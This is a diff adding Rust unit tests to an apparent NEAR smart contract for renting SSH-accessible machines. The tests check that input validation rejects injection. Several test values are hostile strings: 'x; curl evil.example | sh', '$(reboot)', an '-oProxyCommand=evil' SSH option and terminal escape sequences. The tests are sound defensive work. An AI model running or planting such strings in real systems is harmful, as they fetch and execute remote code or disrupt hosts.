@@ -128,6 +128,74 @@ fn unit_ids_are_restricted() {
     let _ = c.list_unit("Bad Id!".into(), terms());
 }
 
+fn listing_with(change: impl FnOnce(&mut Terms)) {
+    let mut t = terms();
+    change(&mut t);
+    let mut c = contract();
+    act_as("owner.testnet", UNIT_STORAGE_FEE);
+    let _ = c.list_unit("box-1".into(), t);
+}
+
+#[test]
+#[should_panic(expected = "E_BAD_HOST")]
+fn a_host_cannot_carry_a_shell_command() {
+    listing_with(|t| t.host = "x; curl evil.example | sh".into());
+}
+
+#[test]
+#[should_panic(expected = "E_BAD_HOST")]
+fn a_host_cannot_use_command_substitution() {
+    listing_with(|t| t.host = "$(reboot)".into());
+}
+
+#[test]
+#[should_panic(expected = "E_BAD_HOST")]
+fn a_host_cannot_be_an_ssh_option() {
+    listing_with(|t| t.host = "-oProxyCommand=evil".into());
+}
+
+#[test]
+#[should_panic(expected = "E_BAD_PRINCIPAL")]
+fn a_principal_cannot_be_an_ssh_option() {
+    listing_with(|t| t.principal = "-oProxyCommand=evil".into());
+}
+
+#[test]
+#[should_panic(expected = "E_BAD_TITLE")]
+fn a_title_cannot_carry_terminal_escapes() {
+    listing_with(|t| t.title = "Nice box\u{1b}]0;owned\u{7}".into());
+}
+
+#[test]
+#[should_panic(expected = "E_BAD_BLURB")]
+fn a_blurb_cannot_carry_terminal_escapes() {
+    listing_with(|t| t.blurb = "line one\nline two".into());
+}
+
+#[test]
+fn real_hosts_are_accepted() {
+    for host in ["203.0.113.7", "gpu-1.example.com", "2001:db8::1", "localhost"] {
+        assert!(valid_host(host), "{host}");
+    }
+}
+
+#[test]
+fn fees_are_published_for_clients() {
+    let c = contract();
+    assert_eq!(c.about().lease_fee.0, LEASE_STORAGE_FEE.as_yoctonear());
+    assert_eq!(c.about().unit_fee.0, UNIT_STORAGE_FEE.as_yoctonear());
+}
+
+#[test]
+#[should_panic(expected = "E_BUSY")]
+fn a_unit_cannot_be_delisted_while_its_key_is_being_cut() {
+    let mut c = listed(terms());
+    act_as("tenant.testnet", deposit(100));
+    let _ = c.rent("box-1".into(), 1, Some(SSH_KEY.into()), None);
+    act_as("owner.testnet", NearToken::from_yoctonear(0));
+    c.delist_unit("box-1".into());
+}
+
 #[test]
 #[should_panic(expected = "E_USER_ALREADY_LISTED")]
 fn an_owner_cannot_list_one_unix_user_twice() {
